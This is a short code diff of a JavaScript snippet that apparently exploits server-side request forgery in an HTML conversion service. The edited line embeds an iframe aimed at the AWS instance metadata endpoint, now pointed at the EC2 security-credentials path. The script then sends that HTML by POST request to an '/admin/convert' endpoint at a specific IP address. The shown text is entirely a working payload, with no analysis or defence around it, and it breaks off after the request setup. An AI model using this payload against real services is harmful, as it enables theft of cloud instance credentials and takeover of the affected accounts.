@@ -1,4 +1,4 @@
-const htmlCode = '<html><h1>content here</h1><iframe src="http://169.254.169.254/latest/meta-data/identity-credentials/" width="1000" height="2000"><h1>end</h1></html>';
+const htmlCode = '<html><h1>content here</h1><iframe src="http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance" width="1000" height="2000"><h1>end</h1></html>';
 const xhr = new XMLHttpRequest();
 xhr.open("POST", "http://54.180.108.161/admin/convert");
 xhr.setRequestHeader("Content-Type", "application/json");
